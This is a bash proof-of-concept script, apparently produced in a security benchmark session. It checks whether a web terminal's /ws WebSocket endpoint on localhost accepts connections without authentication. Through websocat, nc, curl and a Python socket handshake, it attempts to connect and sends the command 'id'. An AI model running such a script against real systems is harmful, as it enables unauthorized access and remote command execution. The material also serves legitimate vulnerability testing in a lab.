#!/bin/bash
# POC: Demonstrates unauthenticated WebSocket access to web terminal at /ws endpoint with no authentication required
# Target: ./repo
# Created: 2025-11-06T19:37:22.310Z
# Session: benchmark-XBEN-098-24-mhntqov2

# WebSocket Authentication Bypass POC
# Demonstrates unauthenticated access to /ws endpoint

TARGET_URL="http://localhost:22222"
WEBSOCKET_URL="ws://localhost:22222/ws"

echo "=========================================="
echo "WebSocket Authentication Bypass POC"
echo "=========================================="
echo ""

# Test 1: Check if web terminal is accessible without authentication
echo "[*] Test 1: Checking HTTP access without authentication..."
HTTP_RESPONSE=$(curl -v -s "${TARGET_URL}" 2>&1)
HTTP_STATUS=$(echo "$HTTP_RESPONSE" | grep "^< HTTP" | head -1)
echo "[+] HTTP Response: $HTTP_STATUS"

# Check for auth headers
if echo "$HTTP_RESPONSE" | grep -qi "Set-Cookie"; then
    echo "[-] Found Set-Cookie header (may have auth)"
    echo "$HTTP_RESPONSE" | grep "Set-Cookie"
else
    echo "[+] No Set-Cookie header found (no session established)"
fi

if echo "$HTTP_RESPONSE" | grep -qi "WWW-Authenticate"; then
    echo "[-] Found WWW-Authenticate header (auth required)"
else
    echo "[+] No WWW-Authenticate header (no auth challenge)"
fi

if echo "$HTTP_RESPONSE" | grep -qi "401\|403"; then
    echo "[-] Got 401/403 Unauthorized response"
else
    echo "[+] Did not get 401/403 - likely accessible without auth"
fi

echo ""

# Test 2: Check for WebSocket upgrade capability
echo "[*] Test 2: Attempting WebSocket connection..."

# Use websocat if available, otherwise use nc for manual handshake
if command -v websocat &> /dev/null; then
    echo "[*] Using websocat to test WebSocket connection..."
    
    # Attempt to connect and send a simple command
    (
        echo "id"
        sleep 1
        echo "exit"
    ) | timeout 3 websocat "$WEBSOCKET_URL" 2>&1 || true
    
elif command -v socat &> /dev/null; then
    echo "[*] Using socat to test WebSocket connection..."
    
    # Send WebSocket upgrade request manually
    HANDSHAKE="GET /ws HTTP/1.1\r\nHost: localhost:22222\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==\r\nSec-WebSocket-Version: 13\r\n\r\n"
    
    (
        printf "$HANDSHAKE"
        sleep 2
    ) | nc localhost 22222 2>&1 | head -20 || true
    
else
    echo "[*] Testing WebSocket upgrade with curl HTTP/2..."
    
    # Use curl to test basic connectivity
    curl -v -i -N -H "Upgrade: websocket" \
         -H "Connection: Upgrade" \
         -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
         -H "Sec-WebSocket-Version: 13" \
         "${TARGET_URL}/ws" 2>&1 | head -20 || true
fi

echo ""
echo "[*] Test 3: Checking HTML content for WebSocket code..."

# Check if HTML contains direct WebSocket connection
if curl -s "${TARGET_URL}" | grep -i "websocket\|ws://" > /dev/null; then
    echo "[+] Found WebSocket connection in HTML"
    echo "[+] WebSocket details:"
    curl -s "${TARGET_URL}" | grep -i "websocket\|ws://" | head -3
else
    echo "[-] No WebSocket code found in HTML"
fi

echo ""
echo "=========================================="
echo "POC Summary:"
echo "=========================================="
echo "[*] Attempting to establish unauthenticated WebSocket session..."

# Final test: Try to connect and execute command
if command -v python3 &> /dev/null; then
    echo "[*] Using Python3 to establish WebSocket connection..."
    
    python3 << 'PYEOF'
import socket
import base64
import hashlib

def create_websocket_handshake(host, port, path):
    """Create a WebSocket upgrade request"""
    key = "SGVsbG8sIHdvcmxkIQ=="
    handshake = f"""GET {path} HTTP/1.1\r
Host: {host}:{port}\r
Upgrade: websocket\r
Connection: Upgrade\r
Sec-WebSocket-Key: {key}\r
Sec-WebSocket-Version: 13\r
\r
"""
    return handshake

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    sock.connect(("localhost", 22222))
    
    handshake = create_websocket_handshake("localhost", 22222, "/ws")
    sock.send(handshake.encode())
    
    response = sock.recv(1024).decode()
    
    if "101" in response or "Switching Protocols" in response:
        print("[✓] WebSocket upgrade accepted (101 Switching Protocols)")
        print("[✓] Connection established WITHOUT authentication!")
        print("\n[!] VULNERABILITY CONFIRMED:")
        print("    - WebSocket accepts connection without credentials")
        print("    - No authentication validation on upgrade")
        print("    - Remote command execution possible")
    else:
        print("[-] WebSocket upgrade failed or requires auth")
        print(response[:200])
    
    sock.close()
except Exception as e:
    print(f"[*] Connection test: {str(e)}")

PYEOF
fi

echo ""
echo "[*] POC Complete"